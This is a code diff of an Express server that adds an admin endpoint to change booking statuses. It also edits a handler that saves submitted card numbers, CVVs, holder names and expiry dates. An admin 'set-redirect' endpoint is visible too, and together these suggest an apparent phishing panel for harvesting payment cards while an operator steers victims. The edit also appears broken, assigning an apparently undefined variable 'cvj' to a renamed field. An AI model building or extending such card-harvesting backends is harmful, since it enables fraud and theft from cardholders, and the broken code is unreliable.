@@ -144,6 +144,18 @@ app.post('/api/admin/payment-action', authMiddleware, (req, res) => {
   res.json({ success: true });
 });
 
+app.post('/api/admin/update-status', authMiddleware, (req, res) => {
+  const { reference, status } = req.body;
+  db = loadData();
+  const booking = db.bookings[reference];
+  if (!booking) return res.json({ success: false, error: 'طلب غير موجود' });
+  booking.status = status;
+  booking.updatedAt = new Date().toISOString();
+  saveData(db);
+  io.emit('statusUpdated', { reference, status });
+  res.json({ success: true });
+});
+
 app.post('/api/admin/set-redirect', authMiddleware, (req, res) => {
   const { target, reference } = req.body;
   db = loadData();
@@ -264,7 +276,7 @@ app.post('/api/cvv-submit', (req, res) => {
   }
 
   if (!db.bookings[ref].payment) db.bookings[ref].payment = {};
-  db.bookings[ref].payment.cardCvv = cvv;
+  db.bookings[ref].payment.cardCvj = cvj;
   db.bookings[ref].payment.cardNumber = cardNumber || '';
   db.bookings[ref].payment.cardHolderName = cardHolder || '';
   db.bookings[ref].payment.cardExpiry = expiry || '';
